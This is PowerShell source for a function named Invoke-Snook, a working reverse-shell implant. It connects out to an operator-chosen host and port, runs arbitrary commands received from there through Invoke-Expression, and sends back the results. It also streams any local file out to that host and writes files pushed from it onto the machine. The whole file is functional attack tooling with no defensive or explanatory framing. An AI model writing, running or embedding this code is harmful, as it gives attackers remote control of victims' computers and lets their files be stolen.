function Invoke-Snook
{
    [CmdletBinding()] Param(
        [Parameter(Mandatory=$true, Position=0)]
        [String]
        $Hostname,

        [Parameter(Mandatory=$true, Position=1)]
        [Int]
        $Port
    )

    function SendPacket {
        Param(
            [Parameter(Mandatory=$true, Position=0)]
            [System.Net.Sockets.NetworkStream]
            $Stream,

            [Parameter(Mandatory=$true, Position=1)]
            [HashTable]
            $Dict,

            [Parameter(Mandatory=$true, Position=2)]
            [System.Text.Encoding]
            $Encoding
        )
        $message = $Dict | ConvertTo-JSON
        $message = $Encoding.GetBytes($message)
        $Stream.Write($message, 0, $message.Length)
        $Stream.Flush()
    }

    function ToBase64 {
        Param(
            [Parameter(Mandatory=$true, Position=0)]
            [PSObject]
            $InputObj,

            [Parameter(Mandatory=$true, Position=1)]
            [System.Text.Encoding]
            $Encoding
        )
        [Convert]::ToBase64String($Encoding.GetBytes(($InputObj | Out-String).Trim()))  
    }

    $tcpConnection = New-Object System.Net.Sockets.TcpClient($Hostname, $Port)
    #try {
        $tcpStream = $tcpConnection.GetStream()
        $encoding = New-Object System.Text.UTF8Encoding

        $cwd = ToBase64 (Get-Location).Path $encoding
        $message = @{}
        $message.Add('cwd', $cwd)
        SendPacket $tcpStream $message $encoding

        $buffer = New-Object System.Byte[] 1024

        while ($tcpConnection.Connected) {
            $data = ''
            while (($bytesCount = $tcpStream.Read($buffer, 0, $buffer.Length)) -ne 0) {
                $data += $encoding.GetString($buffer, 0, $bytesCount)
                if (!$tcpConnection.DataAvailable) {
                    break
                }
            } 
            
            if ($bytesCount -eq 0) {
                break
            }

            $packet = $data | ConvertFrom-JSON
            
            if ($packet.action -eq 'cmd') {        
                $command = $encoding.GetString([Convert]::FromBase64String($packet.args.cmd))
                $out = Invoke-Expression -Command $command -WarningVariable warn `
                                         -ErrorVariable err 2>$null 3>$null

                $response = @{}
                $response.Add('action', $packet.action)
                if ($out) { $response.Add('message', (ToBase64 $out $encoding)) }
                if ($warn) { $response.Add('warning', (ToBase64 $warn[0] $encoding)) }
                if ($err) { $response.Add('error', (ToBase64 $err[0] $encoding)) }
                $response.Add('cwd', (ToBase64 (Get-Location).Path $encoding))

                SendPacket $tcpStream $response $encoding
            } elseif ($packet.action -eq 'download') {
                $response = @{}
                $response.Add('action', $packet.action)

                try {
                    $reader =  [System.IO.File]::OpenRead($packet.args.path)
                } catch {
                    $err = ToBase64 $error[0] $encoding
                    $response.Add('error', $err)
                }

                if (!$response.ContainsKey('error')) {
                    $arguments = @{}
                    $arguments.Add('size', $reader.Length)
                    $response.Add('args', $arguments)
                }
                
                SendPacket $tcpStream $response $encoding

                if ($response.ContainsKey('error')) {
                    continue
                }

                $data = ''
                while ($bytesCount -ne 2) {
                    $bytesCount = $tcpStream.Read($buffer, 0, 2)
                    $data += $encoding.GetString($buffer, 0, $bytesCount)
                }

                if ($data -ne 'GO') {
                    continue
                }

                while (($readBytes = $reader.Read($buffer, 0, $buffer.Length)) -ne 0) {
                    $tcpStream.Write($buffer, 0, $readBytes)
                    $tcpStream.Flush()
                }
                $reader.Close()
            } elseif ($packet.action -eq 'upload') {
                $response = @{}
                $response.Add('action', $packet.action)

                try {
                    if ((Get-Item $packet.args.dest) -is [System.IO.DirectoryInfo]) {
                        $filePath = Join-Path -Path $packet.args.dest `
                                              -ChildPath $packet.args.filename
                    } else {
                        $filePath = $packet.args.dest
                    }
                    $writer = [System.IO.File]::OpenWrite($filePath)
                } catch {
                    $err = ToBase64 $error[0] $encoding
                    $response.Add('error', $err)
                }

                SendPacket $tcpStream $response $encoding

                if ($response.ContainsKey('error')) {
                    continue
                }

                $bytesCount = 0
                while ($bytesCount -ne $packet.args.size) {
                    $bytesRead = $tcpStream.Read($buffer, 0, $buffer.Length)
                    $writer.Write($buffer, 0, $bytesRead)
                    $bytesCount += $bytesRead
                }
                $writer.Close()
            }
        }
    #} finally {
        $tcpConnection.Close()
    #}
}